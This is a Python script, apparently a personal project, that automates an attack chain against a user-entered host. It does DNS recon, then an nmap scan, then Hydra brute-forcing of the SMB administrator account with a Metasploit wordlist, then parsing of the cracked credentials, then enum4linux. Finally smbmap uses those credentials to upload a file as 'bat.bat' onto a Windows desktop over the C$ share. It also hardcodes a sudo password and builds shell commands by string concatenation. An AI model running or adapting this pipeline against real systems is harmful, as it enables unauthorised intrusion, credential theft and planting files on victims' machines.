import os
import shutil
import re
import shutil

#Creat by Peiman mezzo
####################################################################
#remove inside of folder
def Remove_path(path,ip_output):
    
    #Remove Command output folder and mak it again
    if (os.path.exists(path)== True):
        shutil.rmtree(path)
    else:
        os.mkdir(path)
        
    for dir in os.listdir(path):
        shutil.rmtree(os.path.join(path, dir))
    if os.path.exists(ip_output):
        os.remove(ip_output)

ip_output='/home/peiman/Python/ip_output.txt'
config_path = '/home/peiman/Python/Command output'
Remove_path(config_path,ip_output)

####################################################################

def smbmap(server,username,password):
    
    sudoPassword='1' 
    #Make command samba map and send it with sudo access
    CMD_smbmap_1 = str( 'smbmap -H ' + ip_find + ' -u ' + username + ' -p ')
    CMD_smbmap_2 = str(str(password) + " --upload '/home/peiman/Python/Hi.txt' 'c$\\Users\PeimanPARSA\Desktop\\bat.bat'")
    CMD_smbmap = CMD_smbmap_1 + CMD_smbmap_2
    print('Prnt command CMD_smbmap:    ' , CMD_smbmap)
    Output_CMD_smbmap = os.popen('echo %s|sudo -S %s' % (sudoPassword,str(CMD_smbmap)))
    #output_smbmap = Output_CMD_smbmap.read() 
    #print(output_smbmap)

    #Make command enum4linux and send it with sudo access
    CMD_enum4linux = ( 'enum4linux -a' + ' -u ' + username + ' -p ' + password + ' ' + ip_find)
    print('Prnt command enum4linux:    ' , CMD_enum4linux)
    CMD_enum4linux = str(CMD_enum4linux)
    Output_CMD_enum4linux = os.popen('echo %s|sudo -S %s' % (sudoPassword,CMD_enum4linux))
    output_enum4linux = Output_CMD_enum4linux.read() 
    
    #Check if text fiel f_enum4linux exist write output_enum4linux on it else make and then
    f_enum4linux  = '/home/peiman/Python/Command output//f_enum4linux.txt'
    if (os.path.exists(f_enum4linux) == False):
        output_enum4linux_Output = open(f_enum4linux, "w")
        output_enum4linux_Output = open(f_enum4linux, "a")
        output_enum4linux_Output.write(output_enum4linux)
        output_enum4linux_Output.close()
    else:
        output_enum4linux_Output = open(f_enum4linux, "r+")
        output_enum4linux_Output.truncate(0)
        output_enum4linux_Output = open(f_enum4linux, "a")
        output_enum4linux_Output.write(output_enum4linux)
        output_enum4linux_Output.close()
  

####################################################################

#Find_IP from textfile with regex
def Find_IP(textfile):
    for line in textfile:
        if re.search(' A', line):
            #regex format
            ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', line)
            if ip:
                # Add each ip to ip text file
                for i in ip:
                    a_ip = r"/home/peiman/Python/ip_output.txt"
                    if not os.path.exists(a_ip):
                        open(a_ip, 'w').close()
                        a_ip = open('/home/peiman/Python/ip_output.txt', "a")
                        # Write IP as string
                        a_ip.write(str(i))
                        #print(i)
                        a_ip.write('\n') 
                       

####################################################################

#Find user pass login SMB from Hydra
def Find_User_Pass(Hydra_Host):
    
    #Open Hydra file and read
    fo_User=open(Hydra_Host,"r")
    for lines_user in fo_User.readlines():
        #Find user name front of login:
        match_User = re.search(r'(?<=login:) +([^ -.]*)', lines_user)
        if match_User:
            User_Hydra = match_User.group()
            User_Hydra = User_Hydra.replace(" ", "")
            print(User_Hydra)
            
            #Check if text fiel User_Hydra exist write User_Hydra on it else make and then
            User_pass_Hydra = '/home/peiman/Python/Command output/User_Hydra.txt'
            if (os.path.exists(User_pass_Hydra) == False):
                User_pass_Hydra_Output = open(User_pass_Hydra, "w")
                User_pass_Hydra_Output = open(User_pass_Hydra, "a")
                User_pass_Hydra_Output.write(User_Hydra)
                User_pass_Hydra_Output.close()
            else:
                User_pass_Hydra_Output = open(User_pass_Hydra, "r+")
                User_pass_Hydra_Output.truncate(0)
                User_pass_Hydra_Output = open(User_pass_Hydra, "a")
                User_pass_Hydra_Output.write(User_Hydra)
                User_pass_Hydra_Output.close()

            
    fo_Pass=open(Hydra_Host,"r")     
    for lines_Pass in fo_Pass.readlines():
        #Find user name front of password:
        match_Pass = re.search(r'(?<=password:) +([^ -.]*)', lines_Pass)
        if match_Pass:
            Pass_Hydra = match_Pass.group()
            Pass_Hydra = Pass_Hydra.replace(" ", "")
            print(Pass_Hydra)
            
            #Check if text fiel Pass_Hydra exist write pass_Hydra on it else make and then
            User_pass_Hydra = '/home/peiman/Python/Command output/pass_Hydra.txt'
            if (os.path.exists(User_pass_Hydra) == False):
                User_pass_Hydra_Output = open(User_pass_Hydra, "w")
                User_pass_Hydra_Output = open(User_pass_Hydra, "a")
                User_pass_Hydra_Output.write(Pass_Hydra)
                User_pass_Hydra_Output.close()
            else:
                User_pass_Hydra_Output = open(User_pass_Hydra, "r+")
                User_pass_Hydra_Output.truncate(0)
                User_pass_Hydra_Output = open(User_pass_Hydra, "a")
                User_pass_Hydra_Output.write(Pass_Hydra)
                User_pass_Hydra_Output.close()
       
    #From pass_Hydra remove [ . ] .'  from pass_Hydra and put on  smbmap function
    with open(User_pass_Hydra) as User_pass_Hydra_List:
        Pass_Hydra_Pass=User_pass_Hydra_List.read().splitlines()
    Pass_Hydra_Pass=str(Pass_Hydra_Pass)
    Pass_Hydra_Pass=Pass_Hydra_Pass.replace("['", "")
    Pass_Hydra_Pass=Pass_Hydra_Pass.replace("']", "")
    
    smbmap(ip_nmap,User_Hydra,Pass_Hydra_Pass)
            
####################################################################

#DNSRECON 
def dnsrecon (host):
    
    CMD_dnsrecon = ('dnsrecon -d ' + host)
    output_CMD_dnsrecon = os.popen(str(CMD_dnsrecon))
    outputcmd_dnsrecon=output_CMD_dnsrecon.read()
    CMDfilename_dnsrecon = str(host + '.txt')
    # creat folder with hostname of SW
    newpath_dnsrecon = os.path.join('/home/peiman/Python/Command output/dnsrecon/', host)
    if not os.path.exists(newpath_dnsrecon):
        os.makedirs(newpath_dnsrecon)
    # creat string of path
    newpath_dnsrecon = str(newpath_dnsrecon)
    # creat text file in path of hostname
    filepath_dnsrecon = os.path.join(newpath_dnsrecon, CMDfilename_dnsrecon)
    if not os.path.exists('/home/peiman/Python/Command output/dnsrecon/'):
        os.makedirs('/home/peiman/Python/Command output/dnsrecon/')
    f_dnsrecon = open(filepath_dnsrecon, "w")
    f_dnsrecon.truncate(0)
    f_dnsrecon = open(filepath_dnsrecon, "a")
    # write config to hostname file
    f_dnsrecon.write(outputcmd_dnsrecon)
    #Find ip and save on file
    Read_dnsTXT = open('/home/peiman/Python/ip_input.txt',"w")
    Read_dnsTXT.write(outputcmd_dnsrecon)
    Read_dnsTXT=open('/home/peiman/Python/ip_input.txt',"r")
    DNS_Output=Read_dnsTXT.readlines()
    Find_IP(DNS_Output)
    
host_dns=input('Please enter host name: ')
#host_dns = "company.smbserver.com"
dnsrecon (host_dns)

####################################################################
#Run nmap for ip

def nmap (host,sudoPassword):
    
    CMD_nmap = ('sudo nmap -Pn -F -sV -O  ' + host)
    cmd_nmap = os.popen('echo %s|sudo -S %s' % (sudoPassword,CMD_nmap))
    output_nmap = cmd_nmap.read()
    #print (output_nmap)
    CMDfilename_nmap = str(host  + '.txt')
    # creat folder with hostname of SW
    newpath_nmap = os.path.join('/home/peiman/Python/Command output/nmap/', host)
    if not os.path.exists(newpath_nmap):
        os.makedirs(newpath_nmap)
    # creat string of path
    newpath_nmap = str(newpath_nmap)
    # creat text file in path of hostname
    filepath_nmap = os.path.join(newpath_nmap, CMDfilename_nmap)
    #print(filepath_nmap)
    if not os.path.exists('/home/peiman/Python/Command output/nmap/'):
        os.makedirs('/home/peiman/Python/Command output/nmap/')
    f_nmap = open(filepath_nmap, "w")
    f_nmap.truncate(0)
    f_nmap = open(filepath_nmap, "a")
    # write config to hostname file
    f_nmap.write(output_nmap)


sudoPass="1"
#sudoPass=input("Please type sudo pass: ")
Read_IP_List=open('/home/peiman/Python/ip_output.txt',"r")
ip_nmap=Read_IP_List.read()
ip_nmap_list = ip_nmap.split("\n")

for ip_nmap in ip_nmap_list:
    ip_Line = re.findall(r'[0-9]+(?:\.[0-9]+){3}', ip_nmap)
    for ip_find in ip_Line:
        nmap(ip_find,sudoPass)
    
  

####################################################################

#Hydra Enumeration port 22
def Hydra (host,sudoPassword):
    
    CMD_Hydra = ('hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://' +host)
    #print(CMD_Hydra)
    CMD_SSH = os.popen('echo %s|sudo -S %s' % (sudoPassword,CMD_Hydra))
    output_Hydra = CMD_SSH.read()
    #print(output_Hydra)
    CMDfilename_Hydra = str(host + '.txt')
    # creat folder with hostname of SW
    newpath_Hydra = os.path.join('/home/peiman/Python/Command output/Hydra/', host)
    if not os.path.exists(newpath_Hydra):
        os.makedirs(newpath_Hydra)
    # creat string of path
    newpath_Hydra = str(newpath_Hydra)
    # creat text file in path of hostname
    filepath_Hydra = os.path.join(newpath_Hydra, CMDfilename_Hydra)
    #print(filepath_nmap)
    if not os.path.exists('/home/peiman/Python/Command output/Hydra/'):
        os.makedirs('/home/peiman/Python/Command output/Hydra/')
    f_Hydra = open(filepath_Hydra, "w")
    f_Hydra.truncate(0)
    f_Hydra = open(filepath_Hydra, "a")
    # write config to hostname file
    f_Hydra.write(output_Hydra)
    
    #make outeput in another text file for find user pass
    ip_Hydra_Output_txt = '/home/peiman/Python/Command output/ip_Hydra_Output.txt'
    if (os.path.exists(ip_Hydra_Output_txt) == False):
        ip_Hydra_Output = open(ip_Hydra_Output_txt, "w")
        ip_Hydra_Output = open(ip_Hydra_Output_txt, "a")
        ip_Hydra_Output.write(output_Hydra)
        ip_Hydra_Output.close()
    else:
        ip_Hydra_Output = open(ip_Hydra_Output_txt, "r+")
        ip_Hydra_Output.truncate(0)
        ip_Hydra_Output = open(ip_Hydra_Output_txt, "a")
        ip_Hydra_Output.write(output_Hydra)
        ip_Hydra_Output.close()

    Find_User_Pass(str(ip_Hydra_Output_txt))

Read_IP_List=open('/home/peiman/Python/ip_output.txt',"r")
ip_nmap=Read_IP_List.read()
ip_nmap_list = ip_nmap.split("\n")

for ip_check in ip_nmap_list:
    if ip_check.strip():
        #print(ip_nmap)
        Hydra (ip_nmap,sudoPass)

    
####################################################################



